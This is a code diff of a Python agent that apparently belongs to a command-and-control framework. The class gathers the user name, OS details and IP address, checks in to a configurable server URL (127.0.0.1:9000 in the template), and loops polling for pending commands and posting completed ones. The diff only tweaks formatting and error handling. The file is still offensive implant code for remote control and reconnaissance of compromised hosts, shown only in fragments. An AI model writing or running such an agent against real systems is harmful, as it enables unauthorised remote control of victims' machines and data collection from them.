@@ -9,7 +9,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) ## this is to disable ssl warnings
 class Agent(object):
 
-	url = "https://127.0.0.1:9000/" ## gets edited by agent creation
+	url = "https://127.0.0.1:9000/"
 	random_num = random.randint(1000,90000)
 	user_result = subprocess.run(["whoami"],capture_output=True).stdout.decode("utf-8").rstrip()
 	os_result = subprocess.run(["uname","-a"],capture_output=True).stdout.decode("utf-8").rstrip()
@@ -17,7 +17,7 @@ class Agent(object):
 	payload = {"agent_id":"{}".format(random_num),"os":"{}".format(os_result),"ip":"{}".format(ip_result),"user":"{}".format(user_result),"completed_commands":[],"pending_commands":[]}
 	payload = json.dumps(payload)
 	headers = {
-	  'User-Agent': 'test',
+	  'User-Agent':'test',
 	  'Agent': 'test',
 	  'Content-Type': 'application/json'
 	}
@@ -87,14 +87,11 @@ class Agent(object):
 		agent = Agent()
 		agent.first_checkin()
 		while True:
-			try:
-				sleep(10)
-				if agent.check():
-					agent.post_complete_command()
-				else:
-					sleep(1)
-			except:
-				exit(0)
+			sleep(10)
+			if agent.check():
+				agent.post_complete_command()
+			else:
+				sleep(1)
 
 if __name__ == "__main__":
     Agent().main()
